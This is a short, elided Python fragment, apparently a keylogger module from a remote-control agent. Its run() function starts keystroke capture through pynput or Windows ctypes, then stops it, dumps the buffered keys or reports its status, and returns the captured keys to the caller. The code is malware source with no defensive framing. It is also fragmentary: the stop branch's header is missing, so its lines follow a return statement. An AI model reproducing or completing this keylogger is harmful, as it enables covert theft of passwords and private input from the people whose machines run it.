...
def run(action="start", flush=False, **kwargs) -> dict:
    ...
    if action == "start":
        if _running:
            return {"status": "completed", "data": {"running": True, "message": "already running"}}
        _running = True
        if not _start_pynput():
            if not _start_win_ctypes():
                _running = False
                return {"status": "failed", "error": "No keylog backend available"}
        return {"status": "completed", "data": {"running": True, "message": "keylogger started"}}
        ...
        if _listener:
            ...
            _listener = None
        keys = _flush_buffer()
        return {"status": "completed", "data": {"stopped": True, "keys": keys, "count": len(keys)}}

    elif action == "dump":
        keys = _flush_buffer() if flush else _peek_buffer()
        return {"status": "completed", "data": {"keys": keys, "count": len(keys)}}

    elif action == "status":
        with _lock:
            count = len(_buffer)
        return {"status": "completed", "data": {"running": _running, "buffered": count}}
